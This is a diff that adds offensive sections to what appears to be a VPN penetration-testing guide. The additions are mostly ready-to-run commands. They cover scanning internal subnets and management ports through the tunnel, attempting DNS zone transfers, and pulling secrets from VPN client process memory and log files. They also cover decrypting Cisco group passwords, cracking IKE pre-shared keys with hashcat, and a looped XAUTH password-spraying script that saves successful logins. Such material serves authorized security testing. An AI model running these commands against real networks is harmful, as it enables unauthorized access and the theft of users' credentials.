@@ -202,6 +202,172 @@ cat profile.pcf
 grep -i "enc\|hash\|group" profile.pcf
 ```
 
+## Advanced Tunnel Exploitation
+
+### Tunnel Traffic Analysis
+
+Understanding VPN tunnel traffic patterns is essential for identifying misconfigurations and potential exploitation opportunities. Encapsulating Security Payload (ESP) packets carry the encrypted data, but even encrypted traffic reveals information through metadata analysis.
+
+```bash
+# Capture and analyze ESP packet size patterns (reveals data volume and timing)
+tcpdump -i any -w esp_analysis.pcap 'proto 50' -c 1000
+tshark -r esp_analysis.pcap -Y "esp" -T fields \
+  -e ip.src -e ip.dst -e ip.len -e esp.spi -e frame.time_relative 2>/dev/null | \
+  awk '{spi[$4]++; size[$4]+=$5} END {for (s in spi) print s, spi[s], size[s]}' | sort -k2 -rn
+
+# Detect rekey patterns (SA lifetime analysis)
+tshark -r vpn_full.pcap -Y "isakmp.type == 5 or isakmp.type == 34" \
+  -T fields -e frame.time -e isakmp.type 2>/dev/null
+
+# Identify DPD (Dead Peer Detection) timing for session hijacking window
+tshark -r vpn_full.pcap -Y "isakmp.type == 36128 or isakmp.notification_type == 36129" \
+  -T fields -e frame.time -e ip.src -e ip.dst 2>/dev/null
+```
+
+### VPN Route Manipulation
+
+Once authenticated to a VPN, testing the routing and access controls is critical. Many VPN deployments over-provision network access, allowing authenticated users to reach segments they should not be able to access.
+
+```bash
+# Enumerate all accessible routes through the VPN tunnel
+ip route show table all | grep -E "tun|ppp|ppp0"
+
+# Scan for accessible internal networks through VPN
+# Method 1: Sequential host discovery
+for subnet in 10.0.0.0/24 10.0.1.0/24 10.0.2.0/24 172.16.0.0/24 192.168.0.0/24; do
+  echo "Scanning $subnet through VPN..."
+  nmap -sn $subnet --interface tun0 -oG - | grep "Up"
+done
+
+# Method 2: Identify VPN-assigned DNS search domains for target enumeration
+cat /etc/resolv.conf | grep -i search
+# Use discovered domains for targeted enumeration
+dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') +short internal.example.com
+
+# Test for ACL bypass via source routing
+ip route add 10.10.10.0/24 via $(ip route | grep default | awk '{print $3}') dev tun0
+nmap -sT -Pn 10.10.10.0/24 --top-ports 20 --interface tun0
+
+# Check for access to management interfaces through VPN
+nmap -sT -Pn --interface tun0 10.0.0.0/24 -p 22,23,80,443,8080,8443,3389,3306,5432
+```
+
+### DNS and Traffic Interception Through VPN
+
+VPN tunnels often push DNS configuration to the client. Misconfigured DNS push settings can be exploited for internal network reconnaissance and traffic redirection.
+
+```bash
+# Analyze DNS configuration pushed by VPN
+cat /etc/resolv.conf
+# Check for internal domain names revealing organizational structure
+
+# Test DNS resolution through VPN vs direct
+dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') internal.corp.local AXFR
+# Attempt zone transfer for full internal network mapping
+
+# Check for DNS cache snooping to identify visited internal resources
+dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') +dnssec internal-api.corp.local
+
+# Test for VPN DNS server recursion (can be used for DDoS amplification)
+dig @$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}') google.com +dnssec
+```
+
+## VPN Client Security Assessment
+
+VPN client software often introduces vulnerabilities that are overlooked during infrastructure-focused assessments. Client-side vulnerabilities can be exploited to harvest credentials, elevate privileges, or establish persistent access.
+
+### Configuration File Analysis
+
+```bash
+# Analyze OpenVPN configuration for security issues
+cat client.ovpn | grep -iE "auth|cipher|tls|remote|proto|comp-lzo"
+# Flags: comp-lzo (compression enables CRIME/VORACLE attacks)
+# Flags: cipher AES-128-CBC (weak, should be AES-256-GCM)
+# Flags: auth SHA1 (weak, should be SHA256+)
+
+# Analyze Cisco .pcf profile files
+cat vpn_profile.pcf
+# Look for: enc_GroupPwd (encrypted but crackable), Host, AuthType
+# Decrypt Cisco group password from .pcf
+cisco-decrypt <encrypted_password_from_pcf>
+
+# Check WireGuard configuration for security issues
+cat /etc/wireguard/wg0.conf
+# Look for: AllowedIPs = 0.0.0.0/0 (full tunnel, no split)
+# Look for: DNS = (DNS configuration pushed to client)
+# Check for hardcoded private keys
+grep -i "PrivateKey" /etc/wireguard/*.conf
+```
+
+### Client Process Security
+
+```bash
+# Check VPN client process for memory-resident credentials
+# (requires root on the client machine)
+pid=$(pgrep -f "openvpn\|vpnc\|strongswan\|wg-quick")
+if [ -n "$pid" ]; then
+  # Memory map analysis
+  cat /proc/$pid/maps | grep -E "heap|stack"
+  # Environment variable extraction
+  cat /proc/$pid/environ | tr '\0' '\n' | grep -iE "pass|key|secret"
+fi
+
+# Check for credential caching in VPN client log files
+find /var/log /tmp -name "*vpn*" -o -name "*ipsec*" -o -name "*openvpn*" 2>/dev/null | \
+  xargs grep -li "password\|secret\|psk\|private.key" 2>/dev/null
+```
+
+## Advanced Credential Attack Techniques
+
+### Hybrid PSK Cracking
+
+When standard dictionary attacks fail against PSK hashes, hybrid attacks combining dictionary words with numeric suffixes, l33tspeak substitutions, and common organizational patterns can be more effective.
+
+```bash
+# Generate targeted wordlist based on organization information
+# Combine company name with common patterns
+company="AcmeCorp"
+for suffix in "" "123" "1234" "2024" "2025" "vpn" "VPN" "secure" "!@#" "admin"; do
+  echo "${company}${suffix}"
+  echo "${company,,}${suffix}"  # lowercase
+  echo "${company^^}${suffix}"  # uppercase
+done > targeted_wordlist.txt
+
+# Use hashcat hybrid mode (mode 5300 = IKE-PSK)
+hashcat -m 5300 -a 6 psk_hash.txt base_words.txt ?d?d?d?d
+# -a 6 = hybrid: word + mask (append 4 digits)
+
+# Rule-based attack with common transformations
+hashcat -m 5300 -r /usr/share/hashcat/rules/best64.rule psk_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+### XAUTH Credential Testing at Scale
+
+For engagements targeting organizations with many VPN users, automated credential testing against XAUTH can reveal weak passwords across the user base. This should only be performed with explicit authorization and careful rate limiting to avoid account lockouts.
+
+```bash
+# Determine lockout threshold first (test with valid account if available)
+for i in $(seq 1 10); do
+  response=$(timeout 5 vpnc --gateway 192.168.1.1 --id test --secret psk \
+    --username testuser --password "wrong${i}" 2>&1)
+  echo "Attempt $i: $response"
+done
+
+# Targeted credential testing with lockout awareness
+# Space attempts to avoid triggering lockout policies
+while IFS= read -r user; do
+  while IFS= read -r pass; do
+    timeout 10 vpnc --gateway 192.168.1.1 --id group --secret psk \
+      --username "$user" --password "$pass" 2>/dev/null
+    if [ $? -eq 0 ]; then
+      echo "SUCCESS: $user:$pass" | tee -a vpn_creds.txt
+      vpnc-disconnect 2>/dev/null
+    fi
+    sleep 60  # Rate limit to avoid lockout
+  done < passwords.txt
+done < usernames.txt
+```
+
 ## References
 
 - ikeforce — https://github.com/SpiderLabs/ikeforce
@@ -209,3 +375,6 @@ grep -i "enc\|hash\|group" profile.pcf
 - vpnc documentation — https://github.com/streambinder/vpnc
 - RFC 2409 — The Internet Key Exchange (IKE)
 - VPN security testing — PTES Technical Guidelines
+- RFC 7296 — IKEv2 protocol specification
+- hashcat IKE-PSK modes — https://hashcat.net/wiki/doku.php?id=example_hashes
+- VPN Traffic Analysis — SANS Institute Reading Room
